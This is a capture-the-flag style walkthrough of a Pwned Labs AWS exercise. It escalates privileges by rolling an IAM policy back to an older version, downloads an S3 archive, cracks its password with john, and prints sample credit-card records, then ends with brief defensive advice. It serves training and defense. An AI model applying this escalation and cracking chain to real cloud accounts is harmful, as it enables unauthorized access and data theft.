---
title: Escalate Privileges by IAM Policy Rollback
description: Escalate Privileges by IAM Policy Rollback
image:
  path: aws.jpg
categories:
- Pwned Labs
- AWS
layout: post
media_subpath: /assets/posts/labs/pwnedlabs/aws/
tags:
- pwnedlabs
- aws
- cloud
---
# Scenario
During a routine review for Huge Logistics, your team stumbled upon a file named `passwords.xlsx`. Using the AWS credentials found in the file, can you navigate and possibly access sensitive data and resources within Huge Logistics' cloud environment? Remember, it's not just about finding vulnerabilities; it's about understanding the potential consequences and protecting the client. Time to dig deeper!

# Walkthrough
The credentials belong to `intern01` principal

```
└─$ aws sts get-caller-identity
{
    "UserId": "AIDAVVTAGAQAWWWWDWREK",
    "Account": "389970002945",
    "Arn": "arn:aws:iam::389970002945:user/intern01"
}
```
If we check attached policies, we find `intern_policy`
```
└─$ aws iam list-attached-user-policies --user-name intern01
{
    "AttachedPolicies": [
        {
            "PolicyName": "intern_policy",
            "PolicyArn": "arn:aws:iam::389970002945:policy/intern_policy"
        }
    ]
}
```

If we try to list versions of the policy, we find that there are 2 versions
```
└─$ aws iam list-policy-versions --policy-arn  arn:aws:iam::389970002945:policy/intern_policy
{
    "Versions": [
        {
            "VersionId": "v2",
            "IsDefaultVersion": true,
            "CreateDate": "2025-08-29T19:31:17Z"
        },
        {
            "VersionId": "v1",
            "IsDefaultVersion": false,
            "CreateDate": "2025-08-29T19:31:16Z"
        }
    ]
}

```

Let's retrieve the latest one
```
└─$ aws iam get-policy-version --policy-arn arn:aws:iam::389970002945:policy/intern_policy --version-id v2
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Sid": "internpolicy",
                    "Effect": "Allow",
                    "Action": [
                        "iam:GetPolicyVersion",
                        "iam:GetPolicy",
                        "iam:ListPolicyVersions",
                        "iam:GetUserPolicy",
                        "iam:ListAttachedUserPolicies",
                        "iam:SetDefaultPolicyVersion"
                    ],
                    "Resource": [
                        "arn:aws:iam::*:user/intern01",
                        "arn:aws:iam::*:policy/intern_policy"
                    ]
                }
            ]
        },
        "VersionId": "v2",
        "IsDefaultVersion": true,
        "CreateDate": "2025-08-29T19:31:17Z"
    }
}

```

Seems like we can get details of any policy attached to our user and also set the default policy version. If there are other policy versions with more permissions, we can basically switch to them which would grant us more access. In this case, we have the first version, which grants us the ability to list any S3 buckets in the AWS account as well as download data from them
```
└─$ aws iam get-policy-version --policy-arn arn:aws:iam::389970002945:policy/intern_policy --version-id v1
{
    "PolicyVersion": {
        "Document": {
            "Statement": [
                {
                    "Action": [
                        "ec2:DescribeInstances",
                        "s3:ListAllMyBuckets",
                        "s3:GetObject",
                        "s3:ListBucket"
                    ],
                    "Effect": "Allow",
                    "Resource": "*"
                }
            ],
            "Version": "2012-10-17"
        },
        "VersionId": "v1",
        "IsDefaultVersion": false,
        "CreateDate": "2025-08-29T19:31:16Z"
    }
}

```

So let's set default policy version to `v1`
```
└─$ aws iam set-default-policy-version --policy-arn arn:aws:iam::389970002945:policy/intern_policy --version-id v1
```

Now if we list the buckets, we see `huge-logistics-data-751455a292f6`
```
└─$ aws s3 ls
2025-08-30 01:31:17 huge-logistics-data-751455a292f6

```

The bucket contains zip file
```
└─$ aws s3 ls huge-logistics-data-751455a292f6
2025-08-30 01:31:19       4352 amex-export.zip

```
Download it
```
└─$ aws s3 cp s3://huge-logistics-data-751455a292f6/amex-export.zip .
download: s3://huge-logistics-data-751455a292f6/amex-export.zip to ./amex-export.zip

```

Archive is password protected
```
└─$ unzip amex-export.zip     
Archive:  amex-export.zip
[amex-export.zip] amex-export.json password:
```

Let's use `zip2john` to retrieve the hash
```
└─$ zip2john amex-export.zip -o hash
Using file hash as only file to check
```

And then crack it using `john`
```
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash      
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
<REDACTED>       (amex-export.zip)     
1g 0:00:00:00 DONE (2025-08-30 01:51) 1.282g/s 16678Kp/s 16678Kc/s 16678KC/s 1luvu1..1joshcam
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

Unzip the content
```
─$ unzip amex-export.zip
Archive:  amex-export.zip
[amex-export.zip] amex-export.json password: 
  inflating: amex-export.json        
 extracting: flag.txt 
```

And we got access to credit card data
```
└─$ cat amex-export.json 
[    {        "CreditCard": {            "IssuingNetwork": "American Express",            "CardNumber": "374181970164337",            "Name": "Selina Carter",            "Address": "Devon Court 13",            "Country": "Liechtenstein",            "CVV": "433",            "Exp": "10/2024"        }    },    {        "CreditCard": {            "IssuingNetwork": "American Express",            "CardNumber": "377131337333858",            "Name": "Brenton Martinez",            "Address": "Cottage Street 34",            "Country": "United States",            "CVV": "279",            "Exp": "05/2028"        }    },    {        "CreditCard": {            "IssuingNetwork": "American Express",            "CardNumber": "346240654164354",            "Name": "Donald King",            "Address": "Route 30 132",            "Country": "Pakistan",            "CVV": "647",            "Exp": "03/2025"        }    },    {        "CreditCard": {            "IssuingNetwork": "American Express",            "CardNumber": "370094236189853",            "Name": "Caden Anderson",            "Address": "Warren Avenue 33",            "Country": "Philippines",            "CVV": "594",            "Exp": "11/2023"        }    }
<SNIP>
```
# Defense
This part is from [lab's defense section](https://pwnedlabs.io/labs/escalate-privileges-by-iam-policy-rollback)

Make sure to monitor and perform audit of permissions and roles. In this case the `intern` account was assigned the potentially dangerous permission `iam:SetDefaultPolicyVersion`, which granted access to S3 bucket. 

Also, do not store sensitive data in S3 buckets (despite it being zipped with password, it still got cracked due to weak password). 